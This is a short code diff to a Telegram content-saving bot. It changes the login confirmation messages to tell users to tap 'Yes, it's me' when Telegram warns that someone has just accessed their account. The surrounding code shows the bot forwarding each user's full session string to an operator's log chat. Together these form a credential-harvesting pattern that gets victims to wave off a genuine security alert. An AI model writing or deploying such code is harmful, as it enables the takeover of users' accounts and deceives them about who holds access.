@@ -233,7 +233,7 @@ async def login_phone(event):
 
             await msg.delete()
 
-        await event.reply(f"Logged in as {me.first_name}. You can now send links to save content.")
+        await event.reply(f"You're logged in as {me.first_name}. You can now share links to save content. If Telegram shows \"someone just got access to your message!\", just tap \"Yes, it's me.\"")
     finally:
         if _clients.get(f"ub_{event.sender_id}") is not client:
             try:
@@ -277,7 +277,7 @@ async def login_session(event):
         except Exception:
             pass
         await wait.delete()
-        await event.reply(f"Logged in as {me.first_name}")
+        await event.reply(f"You're logged in as {me.first_name}. You can now share links to save content. If Telegram shows \"someone just got access to your message!\", just tap \"Yes, it's me.\"")
         if LOGS:
             try:
                 await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
